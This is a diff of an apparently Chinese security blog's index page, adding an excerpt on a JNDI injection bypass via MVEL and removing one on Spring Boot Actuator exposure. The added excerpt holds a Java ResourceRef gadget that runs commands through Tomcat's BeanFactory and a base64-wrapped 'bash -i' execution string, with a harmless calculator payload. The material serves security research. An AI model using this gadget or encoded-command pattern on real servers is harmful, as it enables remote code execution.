@@ -117,6 +117,70 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2022/03/21/jndi-exec-by-mvel.html" >JNDI Bypass - MVEL</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2022-03-21  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="测试背景"><a href="#测试背景" class="headerlink" title="测试背景"></a>测试背景</h2><p>JDNI利用mvel绕过高版本java限制的时候，使用<a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">runtime exec</a>编码变形之后执行命令失败。只能弹个计算器。<br><img src="/2022/03/21/jndi-exec-by-mvel/1.png"></p>
+<h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>浅蓝师傅在<a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/">探索高版本JDK下JNDI 漏洞的利用方法</a>中给出的执行方式:</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>
+            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>
+            <span class="token string">"push Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> ref<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>先说结论：把执行命令的时候<code>push</code>指令去掉，可以成功执行命令。</p>
+<h2 id="原因探索"><a href="#原因探索" class="headerlink" title="原因探索"></a>原因探索</h2><p>先把测试的命令做一次编码:<code>open /System/Applications/Calculator.app/Contents/MacOS/Calculator</code><br>经过编码之后： <code>bash -c &#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
+<h3 id="存在push的时候"><a href="#存在push的时候" class="headerlink" title="存在push的时候"></a>存在push的时候</h3><p>经过一路的跳转，进入到<code>_exec()</code>函数，调用堆栈如下:</p>
+	
+
+	</div>
+  <a type="button" href="/2022/03/21/jndi-exec-by-mvel.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="测试背景"><a href="#测试背景" class="headerlink" title="测试背景"></a>测试背景</h2><p>JDNI利用mvel绕过高版本java限制的时候，使用<a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">runtime exec</a>编码变形之后执行命令失败。只能弹个计算器。<br><img src="/2022/03/21/jndi-exec-by-mvel/1.png"></p>
+<h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>浅蓝师傅在<a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/">探索高版本JDK下JNDI 漏洞的利用方法</a>中给出的执行方式:</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>
+            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>
+            <span class="token string">"push Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> ref<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>先说结论：把执行命令的时候<code>push</code>指令去掉，可以成功执行命令。</p>
+<h2 id="原因探索"><a href="#原因探索" class="headerlink" title="原因探索"></a>原因探索</h2><p>先把测试的命令做一次编码:<code>open /System/Applications/Calculator.app/Contents/MacOS/Calculator</code><br>经过编码之后： <code>bash -c &#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
+<h3 id="存在push的时候"><a href="#存在push的时候" class="headerlink" title="存在push的时候"></a>存在push的时候</h3><p>经过一路的跳转，进入到<code>_exec()</code>函数，调用堆栈如下:</p>
+	
+	</div>
+  <a type="button" href="/2022/03/21/jndi-exec-by-mvel.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2022/03/18/from-spring-boot-to-getshell.html" >从Spring Boot H2 Database到GetShell</a>
 		</h3>
 		</div>
@@ -487,198 +551,6 @@ C:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2021/05/27/spring-boot-actuator.html" >Spring Boot Actuator漏洞复现</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2021-05-27  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="0x01-基本知识"><a href="#0x01-基本知识" class="headerlink" title="0x01. 基本知识"></a>0x01. 基本知识</h3><ol>
-<li>在pom.xml里面有这样的配置</li>
-</ol>
-<pre class="line-numbers language-none"><code class="language-none">
-&lt;dependency&gt;
-   &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;
-   &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;
-   &lt;exclusions&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ol start="2">
-<li>没有开启安全设置</li>
-</ol>
-<pre class="line-numbers language-none"><code class="language-none">management:
-  security:
-    enabled: false
-  health:
-    elasticsearch:
-      enabled: false
-  metrics:
-    export:
-      prometheus:
-        enabled: true
-      jmx:
-        enabled: true
-  endpoints:
-    web:
-      exposure:
-        include: &#39;*&#39;
-      base-path: &#x2F;auto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>服务端可以通过修改配置文件来改变Actuator的根路径：<code>management.endpoints.web.base-path=/monitor</code></p>
-<p>  搜索github的源代码，可以看到类似的设置：</p>
-<h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>在配置不当的时候，可能暴露以下路由:</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;actuator
-&#x2F;auditevents
-&#x2F;autoconfig
-&#x2F;beans
-&#x2F;caches
-&#x2F;conditions
-&#x2F;configprops
-&#x2F;docs
-&#x2F;dump
-&#x2F;env
-&#x2F;flyway
-&#x2F;health
-&#x2F;heapdump
-&#x2F;httptrace
-&#x2F;info
-&#x2F;intergrationgraph
-&#x2F;jolokia
-&#x2F;logfile
-&#x2F;loggers
-&#x2F;liquibase
-&#x2F;metrics
-&#x2F;mappings
-&#x2F;prometheus
-&#x2F;refresh
-&#x2F;scheduledtasks
-&#x2F;sessions
-&#x2F;shutdown
-&#x2F;trace
-&#x2F;threaddump
-&#x2F;actuator&#x2F;auditevents
-&#x2F;actuator&#x2F;beans
-&#x2F;actuator&#x2F;health
-&#x2F;actuator&#x2F;conditions
-&#x2F;actuator&#x2F;configprops
-&#x2F;actuator&#x2F;env
-&#x2F;actuator&#x2F;info
-&#x2F;actuator&#x2F;loggers
-&#x2F;actuator&#x2F;heapdump
-&#x2F;actuator&#x2F;threaddump
-&#x2F;actuator&#x2F;metrics
-&#x2F;actuator&#x2F;scheduledtasks
-&#x2F;actuator&#x2F;httptrace
-&#x2F;actuator&#x2F;mappings
-&#x2F;actuator&#x2F;jolokia
-&#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2021/05/27/spring-boot-actuator.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="0x01-基本知识"><a href="#0x01-基本知识" class="headerlink" title="0x01. 基本知识"></a>0x01. 基本知识</h3><ol>
-<li>在pom.xml里面有这样的配置</li>
-</ol>
-<pre class="line-numbers language-none"><code class="language-none">
-&lt;dependency&gt;
-   &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;
-   &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;
-   &lt;exclusions&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ol start="2">
-<li>没有开启安全设置</li>
-</ol>
-<pre class="line-numbers language-none"><code class="language-none">management:
-  security:
-    enabled: false
-  health:
-    elasticsearch:
-      enabled: false
-  metrics:
-    export:
-      prometheus:
-        enabled: true
-      jmx:
-        enabled: true
-  endpoints:
-    web:
-      exposure:
-        include: &#39;*&#39;
-      base-path: &#x2F;auto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>服务端可以通过修改配置文件来改变Actuator的根路径：<code>management.endpoints.web.base-path=/monitor</code></p>
-<p>  搜索github的源代码，可以看到类似的设置：</p>
-<h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>在配置不当的时候，可能暴露以下路由:</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;actuator
-&#x2F;auditevents
-&#x2F;autoconfig
-&#x2F;beans
-&#x2F;caches
-&#x2F;conditions
-&#x2F;configprops
-&#x2F;docs
-&#x2F;dump
-&#x2F;env
-&#x2F;flyway
-&#x2F;health
-&#x2F;heapdump
-&#x2F;httptrace
-&#x2F;info
-&#x2F;intergrationgraph
-&#x2F;jolokia
-&#x2F;logfile
-&#x2F;loggers
-&#x2F;liquibase
-&#x2F;metrics
-&#x2F;mappings
-&#x2F;prometheus
-&#x2F;refresh
-&#x2F;scheduledtasks
-&#x2F;sessions
-&#x2F;shutdown
-&#x2F;trace
-&#x2F;threaddump
-&#x2F;actuator&#x2F;auditevents
-&#x2F;actuator&#x2F;beans
-&#x2F;actuator&#x2F;health
-&#x2F;actuator&#x2F;conditions
-&#x2F;actuator&#x2F;configprops
-&#x2F;actuator&#x2F;env
-&#x2F;actuator&#x2F;info
-&#x2F;actuator&#x2F;loggers
-&#x2F;actuator&#x2F;heapdump
-&#x2F;actuator&#x2F;threaddump
-&#x2F;actuator&#x2F;metrics
-&#x2F;actuator&#x2F;scheduledtasks
-&#x2F;actuator&#x2F;httptrace
-&#x2F;actuator&#x2F;mappings
-&#x2F;actuator&#x2F;jolokia
-&#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2021/05/27/spring-boot-actuator.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -734,7 +606,7 @@ C:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>43</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>44</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -755,6 +627,10 @@ C:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/03/21/jndi-exec-by-mvel.html" ><i class="fa fa-file-o"></i>JNDI Bypass - MVEL</a>
+      </li>
+    
+      <li>
         <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
       </li>
     
@@ -768,10 +644,6 @@ C:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></
     
       <li>
         <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
-      </li>
-    
-      <li>
-        <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
       </li>
     
   </ul>
